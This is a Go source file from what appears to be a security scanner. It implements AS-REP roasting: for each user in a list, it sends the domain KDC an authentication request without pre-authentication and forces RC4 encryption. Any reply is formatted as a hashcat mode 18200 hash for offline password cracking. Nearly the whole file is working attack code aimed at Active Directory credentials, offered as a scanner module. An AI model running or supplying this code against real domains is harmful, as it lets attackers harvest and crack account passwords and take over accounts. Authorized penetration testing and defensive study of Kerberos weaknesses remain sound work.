// Package kerberos implements AS-REP roasting and Kerberoasting.
//
// AS-REP roast: for each user with DONT_REQ_PREAUTH set (UAC bit 0x400000),
// request an AS-REQ without pre-auth and receive an AS-REP whose encrypted
// portion is a hashcat-format krb5asrep hash (mode 18200).
//
// Kerberoast: with a valid TGT, request TGS tickets for service principal
// names. The TGS is encrypted with the service account's NTLM hash; output
// is hashcat krb5tgs format (mode 13100).
package kerberos

import (
	"encoding/hex"
	"fmt"

	"github.com/chud-lori/ngehe/internal/finding"
	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// ASREPRoast attempts AS-REP roasting against each user in the list, against
// the KDC at kdcHost. Returns hashcat-format hashes for any user that
// answered with a valid AS-REP (i.e., pre-auth was disabled).
func ASREPRoast(kdcHost, realm string, users []string) []finding.Finding {
	cfg, err := buildKrb5Conf(kdcHost, realm)
	if err != nil {
		return nil
	}
	var out []finding.Finding
	for _, user := range users {
		hash, err := requestASREP(cfg, realm, user)
		if err != nil {
			continue
		}
		out = append(out, finding.Finding{
			Rule: "kerberos-asrep-roast", Severity: finding.SevHigh,
			Method:   "TCP",
			URL:      "kerberos://" + kdcHost,
			Path:     "/",
			Param:    "user",
			Payload:  user,
			Evidence: hash,
			Why:      "AS-REP without pre-auth issued — feed to hashcat mode 18200",
		})
	}
	return out
}

func buildKrb5Conf(kdcHost, realm string) (*config.Config, error) {
	cfgText := fmt.Sprintf(`[libdefaults]
default_realm = %s
dns_lookup_kdc = false
udp_preference_limit = 1

[realms]
%s = {
  kdc = %s
  admin_server = %s
}
`, realm, realm, kdcHost, kdcHost)
	return config.NewFromString(cfgText)
}

// requestASREP sends an AS-REQ with no pre-auth and returns a hashcat hash on
// success. If the user requires pre-auth, the KDC errors and we return ''.
func requestASREP(cfg *config.Config, realm, user string) (string, error) {
	cli := client.NewWithPassword(user, realm, "ngehe-asrep-probe", cfg, client.DisablePAFXFAST(true))

	asreq, err := messages.NewASReqForTGT(realm, cfg, types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{user},
	})
	if err != nil {
		return "", err
	}
	// Force etype RC4-HMAC for the hashcat format we're targeting.
	asreq.ReqBody.EType = []int32{etypeID.RC4_HMAC}

	rb, err := cli.ASExchange(realm, asreq, 0)
	if err != nil {
		return "", err
	}
	// Extract the encrypted timestamp blob from the AS-REP.
	encPart := rb.EncPart
	if encPart.Cipher == nil || len(encPart.Cipher) == 0 {
		return "", fmt.Errorf("empty cipher")
	}
	// hashcat krb5asrep format: $krb5asrep$23$user@REALM:checksum$cipher
	// where checksum = first 16 bytes, cipher = rest.
	cipher := encPart.Cipher
	if len(cipher) < 16 {
		return "", fmt.Errorf("cipher too short")
	}
	checksum := hex.EncodeToString(cipher[:16])
	rest := hex.EncodeToString(cipher[16:])
	return fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s", user, realm, checksum, rest), nil
}
